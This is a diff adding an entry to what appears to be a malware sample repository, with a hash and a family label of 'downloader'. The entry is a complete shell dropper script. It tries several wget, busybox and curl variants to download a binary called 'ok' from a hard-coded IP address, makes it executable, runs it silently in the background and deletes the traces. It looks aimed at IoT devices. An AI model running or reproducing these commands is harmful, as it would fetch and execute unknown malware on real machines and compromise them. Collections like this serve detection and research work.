@@ -1,0 +1,33 @@
+# sha256: dae816b654d8fb648ab4500bfd1112a95b32177c0ae9a526dfb735963667a439
+# family: downloader
+# kind: script
+# size_bytes: 820
+# first_seen: 2026-08-22 20:45:41.956000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
+cd /tmp
+wget http://5.182.210.174/ok
+curl -O http://5.182.210.174/ok
+chmod +x ok
+sh ok
+rm -rf ok
+rm -rf ok.1
+(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &
+cd /tmp
+cd /var/tmp
+cd /dev
+rm -rf ok ok.1
+busybox wget http://5.182.210.174/ok
+wget http://5.182.210.174/ok
+/userfs/bin/wget http://5.182.210.174/ok
+curl -O http://5.182.210.174/ok
+busybox curl -O http://5.182.210.174/ok
+chmod 777 ok
+./ok
+sh ok
+busybox sh ok
+rm -rf ok ok.1
+exit
